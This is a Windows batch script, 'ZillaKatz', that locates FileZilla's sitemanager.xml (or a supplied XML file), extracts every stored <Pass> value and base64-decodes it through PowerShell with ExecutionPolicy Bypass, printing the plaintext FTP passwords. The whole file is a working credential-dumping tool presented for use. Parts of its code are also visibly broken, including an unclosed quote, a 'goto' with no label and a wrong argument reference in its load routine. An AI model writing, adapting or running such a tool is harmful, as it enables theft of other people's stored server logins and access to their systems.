@echo off
setlocal EnableDelayedExpansion
set "locationfile=%APPDATA%\FileZilla\sitemanager.xml"
echo ZillaKatz - A program to get FileZilla credentials 1>&2
if "%~1"=="-?" (goto help)
if "%~1"=="/?" (goto help)
if /i "%~1"=="--help" (goto help)
if /i "%~1"=="-help" (goto help)
if /i "%~1"=="/h" (goto help)
if /i "%~1"=="/help" (goto help)
if /i "%~1"=="-h" (goto help)
if "%~1" neq "" call :load "%~2"


:: Made by anic17
::
:: ZillaKatz - A program to get FileZilla credentials
::
:: 16/7/2020
::


echo.

if not exist "%APPDATA%\FileZilla" (echo FileZilla isn't installed & goto exit)
if not exist "%APPDATA%\FileZilla\sitemanager.xml" (echo Could not find FileZilla site manager credentials & goto exit)

set "zillakatzpath=%APPDATA%\FileZilla"

for /f "tokens=2 delims=>" %%A in ('findstr /i /c:"<Pass" "!locationfile!"') do (call :getstr "%%~A")

pause>nul
exit /B


:getstr
for /f "tokens=1 delims=<" %%A in ('^<nul set /p "=%~1"') do (call :katz "%%~A")
exit /B
:katz
set "b64pwd=%~1"
for /f "delims=" %%K in ('^<nul set /p "=!b64pwd!"') do set "base64password=%%K"
<nul set /p "=Password: "
powershell -ExecutionPolicy Bypass -Command "[Text.Encoding]::UTF8.GetString([convert]::FromBase64String('!base64password!'))"
goto :EOF

:exit
endlocal && exit /B %errorlevel%

:help
echo.
echo Syntax:
echo.
echo ZillaKatz "[full of credentials file]"
echo ZillaKatz --help
echo ZillaKatz
echo.
echo Examples:
echo.
echo ZillaKatz
echo Will search and decrypt for default credentials in FileZilla in "%locationfile%"
echo.
echo ZillaKatz C:\FileZilla\data\creds.xml
echo Will search and decrypt credentials in 'C:\FileZilla\data\creds.xml'
echo.
echo ZillaKatz --help
echo Shows this message
echo.
echo.
echo Copyright (c) 2020 anic17 Software 1>&3
goto exit

:load
if not exist "%~2" echo Could not find specified FileZilla credentials & goto exit
if /i "%~x2" neq ".XML" echo Invalid FileZilla credential document & goto exit
set "locationfile=%~2"
findstr /i /c:"<Pass" "!locationfile! 2>&1>nul
if errorlevel 1 echo Invalid FileZilla credential document & goto exit
goto 
